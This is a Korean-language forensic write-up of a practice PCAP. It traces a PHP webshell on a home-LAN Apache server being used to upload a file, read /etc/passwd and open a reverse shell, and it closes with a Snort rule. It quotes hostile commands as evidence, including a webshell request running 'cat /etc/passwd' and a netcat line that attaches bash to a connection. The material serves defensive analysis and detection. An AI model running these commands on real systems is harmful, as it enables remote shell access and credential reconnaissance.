    Witty server — 가정집 LAN 안의 PHP 웹셸, 파일 업로드, 리버스 셸¶

    사례 요약

    가정집 네트워크(192.168.1.0/24, 도메인 없음)의 5분짜리 연습 PCAP을 Splunk 중심으로, 패킷 내용은 Arkime로 분석한 기록이에요. 이건 악성코드 감염이 아니에요. 윈도우 10 PC(192.168.1.102)가 Kali Linux 웹 서버(wittyserver, 192.168.1.100, 포트 55555의 Apache)에 이미 올라가 있던 PHP 웹셸 minishell.php를 조작해요. 웹셸로 cerber4.PNG를 /tmp에 올리고, cat /etc/passwd를 실행하고, PHP 리버스 셸을 시작해요. 192.168.1.102:4444로 보낸 처음 두 번은 실패하고, 세 번째인 192.168.1.101:4444는 성공해서 www-data 권한의 셸을 2분 동안 쥐어요. 인터넷 쪽 연결이 대부분 비어 보이는 이유(한 방향 캡처), 외부 사이트의 이미지가 C2가 아닌 이유, 초기 침투가 안 보이는 이유도 함께 다뤄요.
    증거 연습용 PCAP, 2017-01-20 09:53:28 – 09:58:40 UTC (약 5분). 출처 기록 없음
    환경 폐쇄망. Zeek 로그가 들어간 Splunk(index=zeek)와 Arkime, 이 PCAP만 들어 있음(케이스 필드나 태그 필요 없음). Wireshark 사용 안 함.
    결과물 분석, Snort 룰 하나
    관련 페이지 BEGUILESOFT — FTP로 유출한 HawkEye(같은 베이스라이닝 방법) · 플레이북: 웹셸/서버 · SPL 치트시트 · Zeek conn.log · Arkime 검색 문법

    이 페이지 읽는 법

    분석한 순서 그대로예요. 베이스라이닝 → 이상한 점 → HTTP → 연결과 파일 → Arkime로 내용 → 초기 침투 → Snort. 새로 나오는 SPL 명령과 필드는 처음 나올 때 설명해요. 질문 상자는 분석하면서 실제로 나온 질문과 답이에요.

    이 페이지의 지표는 실제 값입니다

    도메인과 IP는 실제 캡처에서 나온 값이에요. 본문과 표에서는 무력화([.])했고, 코드 블록 안은 입력한 그대로 두었어요. 절대 접속하지 마세요.

    0단계 — 첫 쿼리 전에¶

    이 PCAP 데이터만 들어 있어서, 다른 케이스에서 쓰던 pcap_case 조건은 필요 없어요. index=zeek만 쓰면 이 케이스예요. Arkime도 tags == 조건 없이 검색하면 돼요.

    • 시간 범위 = All time (데이터가 2017년이라서).
    • Splunk 시간대 = UTC (strftime이 UTC로 나오게).

    1단계 — 베이스라이닝¶

    1-2. DHCP와 Kerberos¶

| eval time=strftime(ts, "%Y-%m-%d %H:%M:%S")

    index=zeek sourcetype=zeek:kerberos
| stats count BY id_orig_h id_resp_h client
    • 이번에 추가한 client_addr는 요청을 보낸 PC의 현재 IP예요. assigned_addr가 빌 때(DHCP INFORM) 유용해요.

    2단계 — 응답이 왜 비어 있나? weird 로그¶

    index=zeek sourcetype=zeek:weird
| stats count BY name
| sort - count

    zeek:weird는 Zeek이 프로토콜 규칙에 안 맞는 이상한 패킷을 봤을 때 남기는 로그예요. name이 이상 현상의 이름이에요.

    name                     count
possible_split_routing   41
data_before_established  40
inappropriate_FIN        15
    • possible_split_routing과 data_before_established는 Zeek이 많은 연결의 한쪽 방향만 봤다는 뜻이에요(예: 3-way handshake 없이 데이터만). inappropriate_FIN도 같은 원인이에요.
    • 그런데 HTTP 로그(3단계)를 보면 192.168.1.100과의 통신에는 응답이 있어요(200, text/html). 그러니까 LAN 안의 통신은 양방향이 다 있고, 인터넷 쪽은 나가는 패킷만 캡처된 거예요. recv 0과 빈 DNS 응답은 이것 때문이에요. 캡처 위치의 특성이지 악성 행위가 아니에요.

    왜 중요한가요

    이걸 확인하지 않으면 82.98.86.178로 "보냄 5,543, 받음 0"을 데이터 유출로 잘못 읽을 수 있어요. 바이트 수를 읽기 전에 캡처가 양방향을 다 봤는지부터 확인하세요.

    3단계 — HTTP: 웹셸¶

    index=zeek sourcetype=zeek:http
| sort ts
| eval time=strftime(ts, "%H:%M:%S")
| table time id_resp_h method host uri status_code user_agent referrer resp_mime_types
    • sort ts를 eval 앞에 둬서 시간순으로 먼저 정렬했어요.

    질문: cmd.exe는 어디서 나온 거죠?

    cmd.exe가 아니라 cmdexe예요. 점이 없어요. 윈도우의 명령 프롬프트(cmd.exe)와는 관계없어요.

    09:55:04 요청 URI에 들어 있던 글자예요.

    GET /minishell.php?path=/var/www/html&cmdexe=cat+/etc/passwd

    URL에서 ? 뒤는 쿼리 문자열이에요. 이름=값 쌍이 &로 이어져 있어요. 이 요청에는 두 쌍이 있어요.

    • path=/var/www/html → 웹셸이 보여 줄 폴더
    • cmdexe=cat+/etc/passwd → 서버에서 실행할 명령 (+는 공백이라서 cat /etc/passwd)

    cmdexe라는 이름은 minishell.php 웹셸을 만든 사람이 정한 변수 이름이에요. "command execute"를 줄인 거예요. 웹셸 화면에 명령 입력칸이 있고, 공격자가 거기에 cat /etc/passwd를 치면 브라우저가 그 값을 cmdexe=라는 이름으로 서버에 보내요. 서버의 PHP 코드는 이 값을 받아서 Linux 셸에서 실행해요.

    Arkime 화면에서도 확인돼요. 09:55:04 세션의 HTTP 칸에 QS Keys: path cmdexe라고 나와요. QS(Query String) Keys는 URL에 들어 있던 변수 이름 목록이에요.

    그리고 이 서버는 윈도우가 아니에요. 응답 헤더가 Server: Apache/2.4.18 (Debian)이고, 리버스 셸 화면에도 Linux wittyserver 4.3.0-kali1-amd64가 나와요. 그래서 cmd.exe는 애초에 있을 수 없어요. 실행된 명령도 cat, ls, id 같은 Linux 명령이에요.

    4-1. 포트 4444(리버스 셸)와 5938(TeamViewer)¶

    index=zeek sourcetype=zeek:conn (id_resp_p=4444 OR id_resp_p=5938)

    • 괄호 안의 OR는 둘 중 하나라도 맞으면 가져와요.

    • /etc/passwd에서 일반 사용자 계정 ry4wn(uid 1000), wordpress(1001), backups(1002)가 보여요. mysql, postgres, couchdb, redis 같은 서비스 계정도 있어요. 공격자가 다음 목표(비밀번호 추측, 권한 상승)를 고를 때 쓰는 정보예요.
    • ls /tmp에 cerber4.PNG가 있어서, 업로드가 디스크에 저장된 게 확인돼요.
    • nc -nv 192.168.1.100 5555 -e /bin/bash는 netcat으로 192.168.1.100:5555에 접속하고 그 연결에 bash를 붙이는 명령이에요. 그런데 목적지가 서버 자기 자신이에요. 결과 (UNKNOWN) [192.168.1.100] 5555 (?) open을 보면 5555에 무언가가 열려 있었어요. 자기 자신과의 통신은 밖으로 나오지 않아서 캡처에 안 보여요. 오타인지, 다른 백도어와 연결하려 한 건지는 호스트 확인이 필요해요.

    5-3. cmdexe=cat /etc/passwd 요청 (09:55:04)¶

    응답이 Content-Encoding: gzip이라서 Arkime 화면에서는 깨져 보여요(libfile content type: application/x-gzip). 압축된 HTML이에요. 같은 /etc/passwd 내용이 리버스 셸에서 평문으로 보였으니 굳이 풀지 않아도 돼요. 이 요청으로 웹셸 단계에서 이미 명령 실행이 됐다는 것만 확인하면 충분해요.

    세션 화면에서 덤으로 보이는 것:

    • MAC 주소: .102 = 90:e6:ba:96:43:32 (ASUSTek), .100 = 6c:0b:84:6a:1d:d8.
    • IP TTL: .102가 128, .100이 64예요. 초기 TTL은 윈도우가 128, Linux가 64라서, 윈도우 클라이언트가 Linux 서버를 공격하는 그림과 맞아요.

    6단계 — 초기 침투는 보이나요?¶

    질문: 이니셜 액세스는 안 보이는 건가요?

    네, 이번 캡처에서는 보이지 않아요. 여기서 초기 침투는 "minishell.php가 처음에 어떻게 서버에 올라갔나"​예요. 근거는 세 가지예요.

    1. 웹셸은 캡처 시작 전부터 서버에 있었어요. .102가 .100:55555에 처음 보낸 요청은 09:53:35 GET /이고, 이어서 /icons/blank.gif, folder.gif, unknown.gif, text.gif, tar.gif를 불러왔어요. Apache 디렉터리 목록 페이지의 아이콘이에요(폴더에 index.html이 없으면 Apache가 파일 목록을 보여 줘요). 4초 뒤 GET /minishell.php의 Referer가 http://192.168.1.100:55555/이에요. 목록 화면에서 클릭해서 들어간 거예요. 파일이 이미 있었다는 뜻이에요.

    2. minishell.php를 올리는 트래픽이 없어요. 서버가 받은 파일은 cerber4.PNG와 작은 폼 데이터뿐이에요. 웹셸을 올린 PUT/POST, FTP, SCP 흔적도 없어요.

    3. 단서: .100 ↔ .101 SSH 세션은 캡처 시작 전에 이미 열려 있었어요(OTH). 웹셸을 올린 경로일 수도 있지만 암호화돼 있어서, 보고서에는 "가능성"으로만 적어요.

    .100에 목록 페이지보다 먼저 들어온 요청이 없는지 확인해요.

    • 새로 나온 head 5는 결과에서 맨 위 5줄만 보여 줘요. 정렬한 다음이라 가장 이른 요청 5개예요.

    질문: Wireshark를 쓰면 안 되는데, 목록 페이지의 파일 날짜는 어떻게 보나요?

    Apache 목록 페이지에는 파일마다 Last modified(수정 날짜)​가 나와서, minishell.php가 언제 생겼는지 알 수 있어요. 응답이 gzip으로 압축돼 있어서 풀어야 해요. Arkime + CyberChef만으로 하는 방법이에요.

    1. Arkime: ip.src == 192.168.1.102 && ip.dst == 192.168.1.100 && port.dst == 55555 && http.method == GET으로 검색하고, 09:53:35 세션 중 URI가 /인 것을 펼쳐요.
    2. Packet Options → Show Images & Files를 켜면 Destination 쪽에 응답 본문 다운로드 링크가 생겨요(헤더 없이 본문만).
    3. CyberChef: 받은 파일을 Input에 넣고 Recipe에 Gunzip(표로 보려면 Render HTML 추가)을 넣은 뒤, minishell.php 옆의 날짜를 봐요.

    링크가 안 생기면: Destination Raw(헤더 + 본문)를 받고, CyberChef Extract Files(GZIP 체크)로 gzip 부분만 잘라 내요(gzip 시작 표시 1f 8b를 찾아 줘요). 그 파일을 저장해서 다시 Gunzip해요.

    이번에는 다운로드가 되지 않아서, 보고서에는 날짜 없이 "Initial access not in capture"로 썼어요.

    7단계 — Snort 룰 하나¶

    alert tcp $HOME_NET any -> $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
    • 내부에서 내부로 가는 트래픽이라 목적지도 $EXTERNAL_NET이 아니라 $HOME_NET이에요.
    • $HOME_NET 55555는 내부 호스트의 포트 55555(웹 서버)로 가는 패킷이에요.
    • content:"minishell.php" + nocase는 웹셸 이름이 들어간 요청을 대소문자 상관없이 잡아요.
    • sid:1000031; rev:1;은 룰 번호와 버전이에요.

    웹셸 요청마다 알림이 하나쯤 나올 거예요(HTTP 목록에 16건). 응답은 포트 55555에서 나가는 패킷이라 안 잡혀요. 테스트 방법은 Night Dew — 8-3에 있어요.

    배운 점¶

    1. 모든 PCAP이 악성코드 감염은 아니에요. 이번에는 사람이 브라우저로 웹셸을 조작했어요. "피해자"는 바쁜 PC가 아니라 서버예요.
    2. 캡처 방향부터 확인해요. possible_split_routing / data_before_established + recv 0 = 한 방향 캡처예요. 유출이 아니에요.
    3. Referer를 읽어요. 82.98.86.178과 code.jquery가 C2가 아니라 웹셸 페이지의 리소스라는 걸 알려 줬어요.
    4. conn_state가 성공 여부를 알려 줘요. S0 = 아무도 답하지 않음. SF + 긴 시간 + 작은/큰 바이트 비율 = 실제로 동작한 대화형 셸.
    5. HTTP 요청과 연결을 초 단위로 맞춰요. 09:56:35의 my_ip=192.168.1.101 = 09:56:35의 SF 연결.
    6. OTH는 "캡처 전에 시작됨"이에요. 미리 열려 있던 SSH 세션은 초기 침투의 단서예요.
    7. 유명한 해시는 알아 두면 좋아요. 5f4dcc3b5aa765d61d8327deb882cf99 = password의 MD5.
    8. TTL로 OS를 짐작해요. 128은 윈도우, 64는 Linux.
    9. cmdexe는 변수 이름이지 cmd.exe가 아니에요. URL은 이름=값 쌍으로 읽어요.
    10. 네트워크로 알 수 없는 건 적어 둬요. 자기 자신으로의 nc, 웹셸이 올라간 경로 → 호스트 확인.
